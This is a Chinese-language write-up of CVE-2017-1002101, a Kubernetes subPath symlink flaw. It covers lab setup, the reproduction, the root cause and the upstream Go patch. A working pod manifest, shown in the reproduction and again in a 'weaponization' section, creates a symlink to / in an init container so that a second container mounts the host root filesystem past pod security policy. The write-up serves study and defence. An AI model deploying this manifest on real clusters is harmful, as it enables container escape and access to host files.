# 【CVE-2017-1002101】Kubernetes文件系统逃逸漏洞

### 产品介绍

K8S(Kubernetes) 是一个可移植的、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。 Kubernetes 拥有一个庞大且快速增长的生态系统。Kubernetes 的服务、支持和工具广泛可用。

### 漏洞简介

CVE-2017-1002101是⼀个Kubernetes的文件系统逃逸漏洞，允许攻击者使用 subPath 卷挂载来访问卷空间外的 文件或目录，CVSS 3.x评分为9.8[1]。所有 v1.3.x 、 v1.4.x 、 v1.5.x 、 v1.6.x 及低于 v1.7.14 、 v1.8.9 和 v1.9.4 版本的Kubernetes均受到影响。

### 背景知识

1. volume、subpath

   kubernetes管理的多个容器内的本地文件通常是非持久化的，容器终止后非持久化的文件会丢失，而且不同的容器直接存在共享文件的需要，因此k8s提供了volume来解决这一问题，有时存在把volume在多处使用的情况，subpath特性允许在为容器挂载volume时指定挂载卷内的子路径。

2. 符号链接

   符号链接指linux下的一类文件，包含指向其他文件或目录的引用，操作一个符号链接文件时，操作系统会将我们的操作解析为对所指向文件或目录的操作，通常使用ln命令进行，例如`ln -s target_path link_path`

### 漏洞复现

1. 环境准备

   使用metarget安装1.9.3版本的k8s `sudo ./metarget cnv install cve-2017-1002101 --domestic`

   设置隐私策略并应用，限制只能挂载/tmp目录下的文件 `kubectl apply -f psp.yaml`

   ````yaml
   # psp.yaml
   apiVersion: extensions/v1beta1
   kind: PodSecurityPolicy
   metadata:
    name: privileged
    annotations:
     seccomp.security.alpha.kubernetes.io/allowedProfileNames: '*'
   spec:
    privileged: true
    allowPrivilegeEscalation: true
    allowedCapabilities:
    - '*'
    volumes:
    - '*'
    allowedHostPaths:
    - pathPrefix: /tmp/
   ````

   应用RBAC `kubectl apply -f rbac1.yaml` `kubectl apply -f rbac2.yaml`

   ````yaml
   # RBAC1.yaml
   apiVersion: rbac.authorization.k8s.io/v1
   kind: ClusterRole
   metadata:
    name: privileged-psp
   rules:
    - apiGroups:
      - policy
      resourceNames:
      - privileged
      resources:
      - podsecuritypolicies
      verbs:
      - use
      
   # RBAC2.yaml
   apiVersion: rbac.authorization.k8s.io/v1
   kind: RoleBinding
   metadata:
    name: kube-system-psp
    namespace: kube-system
   roleRef:
    apiGroup: rbac.authorization.k8s.io
    kind: ClusterRole
    name: privileged-psp
   subjects:
    - apiGroup: rbac.authorization.k8s.io
      kind: Group
      name: system:nodes
    - apiGroup: rbac.authorization.k8s.io
      kind: Group
      name: system:serviceaccounts:kube-system
   
   ````

   然后为API Server配置PodSecurityPolicy插件。编辑API Server的配置⽂件 `/etc/kubernetes/manifests/kube-apiserver.yaml` ，在 --admission-control 命令⾏选项后加 上 PodSecurityPolicy ，然后重启服务 ` service kubelet restart`

   此时创建一个挂载根目录的容器进行测试 `kubectl apply -f testPod.yaml`

   ````yaml
   # testPod.yaml
   apiVersion: v1
   kind: Pod
   metadata:
    name: test
   spec:
    containers:
    - image: ubuntu
      name: test
      volumeMounts:
      - mountPath: /vuln
        name: my-volume
      command: ["sleep"]
      args: ["10000"]
    volumes:
     - name: my-volume
       hostPath:
        path: /
   ````

   无法创建并报错`pods "test" is forbidden: unable to validate against any pod security policy: [spec.volumes[0].hostPath.pathPrefix: Invalid value: "/": is not allowed to be used]`表明环境搭建完成，此时无法创建挂载主机根目录的容器

2. 漏洞复现

   使用exp.yaml创建pod `kubectl apply -f exp.yaml`

   ````yaml
   # exp.yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: my-pod
   spec:
     initContainers:
     - name: prep-symlink
       image: ubuntu
       command: ["bin/sh", "-ec", "ln -s / /mnt/data/testpath"]
       volumeMounts:
       - name: my-volume
         mountPath: /mnt/data
     containers:
     - name: my-container
       image: ubuntu
       command: ["/bin/sh", "-ec", "ls /mnt/data; sleep 999999"]
       volumeMounts:
       - mountPath: /mnt/data
         name: my-volume
         subPath: testpath
     volumes:
     - name: my-volume
       emptyDir: {}
   ````

   发现可以顺利运行容器，此时容器内/mnt/data/目录即为宿主机的根目录`kubectl exec -it my-pod -- ls /mnt/data`


### 漏洞分析

1. subpath的原理

   在启动容器时，k8s会将主机上/var/lib/kubelet/pods/\<pod uid>/volumes/\<volume type>/\<volume name>/拼接上subPath所表示的目录绑定到容器的/mnt/data目录下

2. 漏洞分析

   ````yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: my-pod
   spec:
     initContainers:
     - name: prep-symlink
       image: ubuntu
       command: ["bin/sh", "-ec", "ln -s / /mnt/data/testpath"]
       volumeMounts:
       - name: my-volume
         mountPath: /mnt/data
     containers:
     - name: my-container
       image: ubuntu
       command: ["/bin/sh", "-ec", "ls /mnt/data; sleep 999999"]
       volumeMounts:
       - mountPath: /mnt/data
         name: my-volume
         subPath: testpath
     volumes:
     - name: my-volume
       emptyDir: {}
   ````

   * 在init容器里，`/var/lib/kubelet/pods/1234/volumes/kubernetes.io~empty-dir/my-volume`被挂载到容器的`/mnt/data`路径并启动init容器
   * init容器中使用ln命令创建了`/mnt/data/testpath`->`\`的符号链接然后退出
   * 在正常容器创建时，通过subPath指定装载`/var/lib/kubelet/pods/1234/volumes/kubernetes.io~empty-dir/my-volume`下的testpath，即`/var/lib/kubelet/pods/1234/volumes/kubernetes.io~empty-dir/my-volume/testpath`被装载到容器的`/mnt/data`，此时的testpath为init容器创建的符号链接
   * 绑定挂载时会解析符号链接，在本例中符号链接被解析到主机上，此时容器内部可以访问主机的根目录

### 补丁分析

````go
//subpath_linux.go
func doBindSubPath(mounter mount.Interface, subpath Subpath) (hostPath string, err error) {
	// Linux, kubelet runs on the host:
	// - safely open the subpath
	// - bind-mount /proc/<pid of kubelet>/fd/<fd> to subpath target
	// User can't change /proc/<pid of kubelet>/fd/<fd> to point to a bad place.

	// Evaluate all symlinks here once for all subsequent functions.
    // 解析所有的符号链接
	newVolumePath, err := filepath.EvalSymlinks(subpath.VolumePath)
	if err != nil {
		return "", fmt.Errorf("error resolving symlinks in %q: %v", subpath.VolumePath, err)
	}
	newPath, err := filepath.EvalSymlinks(subpath.Path)
	if err != nil {
		return "", fmt.Errorf("error resolving symlinks in %q: %v", subpath.Path, err)
	}
	klog.V(5).Infof("doBindSubPath %q (%q) for volumepath %q", subpath.Path, newPath, subpath.VolumePath)
	subpath.VolumePath = newVolumePath
	subpath.Path = newPath

    //打开解析过的路径中每一个路径段，确保路径在可挂载的卷内部
	fd, err := safeOpenSubPath(mounter, subpath)
	if err != nil {
		return "", err
	}
	defer syscall.Close(fd)

	alreadyMounted, bindPathTarget, err := prepareSubpathTarget(mounter, subpath)
	if err != nil {
		return "", err
	}
	if alreadyMounted {
		return bindPathTarget, nil
	}

	success := false
	defer func() {
		// Cleanup subpath on error
		if !success {
			klog.V(4).Infof("doBindSubPath() failed for %q, cleaning up subpath", bindPathTarget)
			if cleanErr := cleanSubPath(mounter, subpath); cleanErr != nil {
				klog.Errorf("Failed to clean subpath %q: %v", bindPathTarget, cleanErr)
			}
		}
	}()
	// /proc/<kubelet pid>/fd/<final fd>绑定挂载到Kubelet的Pod目录下的一个子目录。该文件是指向打开文件的链接。如果源文件在被Kubelet打开的时候被替换，那么链接依然指向原始文件，以此防止出现竞态条件
	kubeletPid := os.Getpid()
	mountSource := fmt.Sprintf("/proc/%d/fd/%v", kubeletPid, fd)

	// Do the bind mount
	options := []string{"bind"}
	mountFlags := []string{"--no-canonicalize"}
	klog.V(5).Infof("bind mounting %q at %q", mountSource, bindPathTarget)
    // 绑定挂载subPath到Pod内
	if err = mounter.MountSensitiveWithoutSystemdWithMountFlags(mountSource, bindPathTarget, "" /*fstype*/, options, nil /* sensitiveOptions */, mountFlags); err != nil {
		return "", fmt.Errorf("error mounting %s: %s", subpath.Path, err)
	}
	success = true

	klog.V(3).Infof("Bound SubPath %s into %s", subpath.Path, bindPathTarget)
	return bindPathTarget, nil
}

````

1. 修复方案中，会首先对subPath解析符号链接；
2. 对解析符号链接过的subPath会使用openat()系统调用依次打开每一个路径段（即路径被分割符/分开的各部分），在这个过程中禁用符号链接，确保当前路径位于在volume内部；
3. 将/proc/\<kubelet pid>/fd/\<final fd>绑定挂载到Kubelet的Pod目录下的一个子目录。该文件是指向打开文件的链接。如果源文件在被Kubelet打开的时候被替换，那么链接依然指向原始文件；
4. 将最终的挂载路径fd传入k8s进行挂载。

### 武器化利用

````yaml
apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  initContainers:
  - name: prep-symlink
    image: ubuntu
    command: ["bin/sh", "-ec", "ln -s / /mnt/data/testpath"]
    volumeMounts:
    - name: my-volume
      mountPath: /mnt/data
  containers:
  - name: my-container
    image: ubuntu
    command: ["/bin/sh", "-ec", "ls /mnt/data; sleep 999999"]
    volumeMounts:
    - mountPath: /mnt/data
      name: my-volume
      subPath: testpath
  volumes:
  - name: my-volume
    emptyDir: {}
````

创建该容器后，主机的根目录已经被挂载进容器的/mnt/data目录，使用`kubectl exec -it my-pod -- /bin/sh`即可访问